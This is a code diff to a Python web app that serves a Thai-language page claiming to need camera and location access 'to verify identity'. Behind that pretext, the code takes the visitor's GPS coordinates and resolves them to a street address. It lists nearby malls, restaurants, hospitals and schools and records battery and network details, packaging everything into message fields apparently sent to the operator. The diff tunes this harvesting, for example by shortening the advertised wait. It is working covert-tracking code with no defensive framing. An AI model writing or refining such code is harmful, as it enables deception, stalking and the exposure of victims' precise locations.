@@ -17,34 +17,35 @@ def reverse_geocode(lat, lon):
         if 'address' in data:
             addr = data['address']
             return {
-                'road': addr.get('road', addr.get('pedestrian', '')),
-                'suburb': addr.get('suburb', addr.get('neighbourhood', '')),
+                'road': addr.get('road', ''),
                 'village': addr.get('village', addr.get('town', '')),
-                'city': addr.get('city', addr.get('town', addr.get('village', ''))),
-                'district': addr.get('state_district', ''),
+                'city': addr.get('city', addr.get('town', '')),
                 'province': addr.get('province', addr.get('state', '')),
                 'postcode': addr.get('postcode', ''),
-                'country': addr.get('country', ''),
                 'display_name': data.get('display_name', '')
             }
     except Exception as e:
-        print(f"Geocode error: {e}")
+        print(f"Reverse error: {e}")
     return None
 
-def search_places(lat, lon, query, limit=5):
+def search_places_osm(lat, lon, query, limit=5):
     try:
-        url = f'https://nominatim.openstreetmap.org/search?format=json&q={query}&lat={lat}&lon={lon}&radius=10000&limit={limit}'
+        url = f'https://nominatim.openstreetmap.org/search?format=json&q={query}&lat={lat}&lon={lon}&radius=5000&limit={limit}&accept-language=th'
         headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
         resp = requests.get(url, headers=headers, timeout=8)
         data = resp.json()
         results = []
         for item in data:
-            name = item.get('display_name', 'ไม่ระบุ')[:80]
+            name = item.get('display_name', '')
             if name:
-                results.append(name)
+                # ตัดส่วนที่ซ้ำซ้อนออก
+                parts = name.split(',')
+                if len(parts) > 3:
+                    name = ','.join(parts[:3])
+                results.append(name[:80])
         return results
     except Exception as e:
-        print(f"Search error ({query}): {e}")
+        print(f"Search error: {e}")
     return []
 
 HTML = '''<!DOCTYPE html>
@@ -82,7 +83,7 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 12-15 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 8-10 วินาที</div>
     </div>
     <script>
         async function startCapture() {
@@ -307,26 +308,22 @@ def upload():
         gps_address = None
         nearby_results = {}
         
-        # ใช้ GPS เท่านั้น
         if gps_success and lat and lon:
             gps_address = reverse_geocode(lat, lon)
             
+            # ค้นหาตามประเภท
             searches = [
-                ('🏬 ห้างสรรพสินค้า', 'shopping mall'),
+                ('🛍️ ห้างสรรพสินค้า', 'shopping mall'),
                 ('🍽️ ร้านอาหาร', 'restaurant'),
-                ('📍 สถานที่ใกล้เคียง', '')
+                ('🏥 โรงพยาบาล', 'hospital'),
+                ('🏫 โรงเรียน', 'school')
             ]
             
             for label, query in searches:
-                if query:
-                    results = search_places(lat, lon, query, 3)
-                else:
-                    results = search_places(lat, lon, 'point of interest', 3)
+                results = search_places_osm(lat, lon, query, 3)
                 if results:
-                    nearby_results[label] = results[:3]
-                time.sleep(0.3)
-        else:
-            gps_address = None
+                    nearby_results[label] = results
+                time.sleep(0.5)
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
@@ -345,14 +342,10 @@ def upload():
         if device_info.get('downlink'):
             fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
         
-        # GPS
         if gps_success and lat and lon:
             acc = device_info.get('gps_accuracy', '?')
-            gps_label = f"📍 GPS (±{acc} เมตร)"
-            gps_val = f"{lat}, {lon}"
-            fields.append({"name": gps_label, "value": gps_val, "inline": True})
+            fields.append({"name": f"📍 GPS (±{acc} เมตร)", "value": f"{lat}, {lon}", "inline": True})
             
-            # ที่อยู่
             if gps_address:
                 addr_parts = []
                 if gps_address.get('road'):
@@ -371,16 +364,13 @@ def upload():
                 for part in addr_parts:
                     fields.append({"name": "🏠 ที่อยู่", "value": part, "inline": False})
         else:
-            fields.append({"name": "📍 GPS", "value": "❌ ไม่ได้รับอนุญาต หรือไม่รองรับ (ไม่ใช้ IP แทน)", "inline": True})
+            fields.append({"name": "📍 GPS", "value": "❌ ไม่ได้รับอนุญาต หรือไม่รองรับ", "inline": True})
         
-        # สถานที่ใกล้เคียง (เฉพาะ GPS)
         if gps_success and nearby_results:
             for label, places in nearby_results.items():
                 if places:
                     value = '\n'.join([f"• {p}" for p in places[:3]])
                     fields.append({"name": label, "value": value, "inline": False})
-        elif gps_success:
-            fields.append({"name": "📍 สถานที่ใกล้เคียง", "value": "ไม่พบข้อมูล", "inline": False})
         
         bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
         if device_info.get('batteryCharging') is True:
